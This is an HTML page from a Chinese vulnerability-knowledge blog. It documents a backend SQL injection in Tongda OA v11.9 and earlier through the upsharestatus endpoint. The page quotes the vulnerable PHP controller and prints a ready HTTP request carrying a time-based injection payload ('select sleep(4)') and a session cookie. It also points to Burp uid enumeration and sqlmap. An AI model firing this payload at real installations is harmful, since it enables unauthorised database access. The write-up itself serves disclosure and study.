@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>通达OA v11.9 upsharestatus 后台SQL注入漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="通达OA v11.9 upsharestatus 后台SQL注入漏洞" />
+<meta property="og:description" content="通达OA v11.9 upsharestatus 后台SQL注入漏洞 漏洞描述 通达OA v11.9 及以下版本中由于某些参数过滤不完善导致后台存在SQL注入漏洞 漏洞影响 1 通达OA &lt;= v11.9 环境搭建 1" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="通达OA v11.9 upsharestatus 后台SQL注入漏洞"/>
+<meta name="twitter:description" content="通达OA v11.9 upsharestatus 后台SQL注入漏洞 漏洞描述 通达OA v11.9 及以下版本中由于某些参数过滤不完善导致后台存在SQL注入漏洞 漏洞影响 1 通达OA &lt;= v11.9 环境搭建 1"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "通达OA v11.9 upsharestatus 后台SQL注入漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  452 ,
+        "url": "http:\/\/example.org\/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">通达OA v11.9 upsharestatus 后台SQL注入漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;452 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="通达oa-v119-upsharestatus-后台sql注入漏洞">通达OA v11.9 upsharestatus 后台SQL注入漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>通达OA v11.9 及以下版本中由于某些参数过滤不完善导致后台存在SQL注入漏洞</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通达OA &lt;=  v11.9
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="环境搭建">环境搭建</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>双击安装</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091122432.png"
+        data-srcset="/images/202202091122432.png, /images/202202091122432.png 1.5x, /images/202202091122432.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091122432.png"
+        title="image-20220209112211968" /></p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>漏洞文件位 <strong>webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">actionUpsharestatus</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Yii</span><span class="o">::</span><span class="nv">$app</span><span class="o">-&gt;</span><span class="na">response</span><span class="o">-&gt;</span><span class="na">format</span> <span class="o">=</span> <span class="nx">yii\web\Response</span><span class="o">::</span><span class="na">FORMAT_JSON</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$data</span> <span class="o">=</span> <span class="nx">modules\appdesign\models\AppUtils</span><span class="o">::</span><span class="na">toGBK</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">modules\portal\controllers\intval</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;LOGIN_UID&#34;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">modules\portal\models\PortalWorkbench</span><span class="o">::</span><span class="na">updateAll</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;state&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;status&#34;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">),</span> <span class="s2">&#34;id=</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;status&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">modules\portal\models\PortalWorkbenchState</span><span class="o">::</span><span class="na">deleteAll</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;wids&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;uid&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;LOGIN_UID&#34;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$Work</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">modules\portal\models\PortalWorkbenchState</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$Work</span><span class="o">-&gt;</span><span class="na">wids</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$Work</span><span class="o">-&gt;</span><span class="na">uid</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;LOGIN_UID&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$Work</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nv">$dataBack</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;status&#34;</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;msg&#34;</span> <span class="o">=&gt;</span> <span class="nx">modules\portal\controllers\_</span><span class="p">(</span><span class="s2">&#34;操作成功&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$dataBack</span> <span class="o">=</span> <span class="nx">modules\appdesign\models\AppUtils</span><span class="o">::</span><span class="na">toUTF8</span><span class="p">(</span><span class="nv">$dataBack</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$dataBack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091122220.png"
+        data-srcset="/images/202202091122220.png, /images/202202091122220.png 1.5x, /images/202202091122220.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091122220.png"
+        title="image-20220209112228111" /></p>
+<p>其中 <strong>updateAll()</strong> 函数并没有使用防止 SQL注入的 <strong>sql_injection()</strong> 来防止注入</p>
+<p><strong>webroot/inc/conn.php</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091122281.png"
+        data-srcset="/images/202202091122281.png, /images/202202091122281.png 1.5x, /images/202202091122281.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091122281.png"
+        title="image-20220209112245130" /></p>
+<p>所以这里就出现了 id 参数存在注入的情况，请求包如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: oa.tongda2000.com
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Content-Length: 36
+</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
+</span></span><span class="line"><span class="cl">sec-ch-ua: &#34;Google Chrome&#34;;v=&#34;89&#34;, &#34;Chromium&#34;;v=&#34;89&#34;, &#34;;Not A Brand&#34;;v=&#34;99&#34;
+</span></span><span class="line"><span class="cl">sec-ch-ua-mobile: ?0
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+</span></span><span class="line"><span class="cl">Origin: https://oa.tongda2000.com
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: navigate
+</span></span><span class="line"><span class="cl">Sec-Fetch-User: ?1
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: document
+</span></span><span class="line"><span class="cl">Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+</span></span><span class="line"><span class="cl">Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241
+</span></span><span class="line"><span class="cl">x-forwarded-for: 127.0.0.1
+</span></span><span class="line"><span class="cl">x-originating-ip: 127.0.0.1
+</span></span><span class="line"><span class="cl">x-remote-ip: 127.0.0.1
+</span></span><span class="line"><span class="cl">x-remote-addr: 127.0.0.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uid=15&amp;status=1&amp;id=1;select sleep(4)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意 uid参数 要为当前用户的uid才能完成请求，可以使用 burp 遍历查看时间响应</p>
+<p>例如这里使用官网的测试账户 uid 遍历出为 15</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091123903.png"
+        data-srcset="/images/202202091123903.png, /images/202202091123903.png 1.5x, /images/202202091123903.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091123903.png"
+        title="image-20220209112303802" /></p>
+<p>如果uid错误则不会出现时间延迟，将请求包放入 Sqlmap跑一下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091123191.png"
+        data-srcset="/images/202202091123191.png, /images/202202091123191.png 1.5x, /images/202202091123191.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091123191.png"
+        title="image-20220209112326082" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="通达OA v11.9 upsharestatus 后台SQL注入漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="通达OA v11.9 upsharestatus 后台SQL注入漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="通达OA v11.9 upsharestatus 后台SQL注入漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="通达OA v11.9 upsharestatus 后台SQL注入漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞</a>
+            <a href="/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="通达OA v11.9 getdata 任意命令执行漏洞">通达OA v11.9 getdata 任意命令执行漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
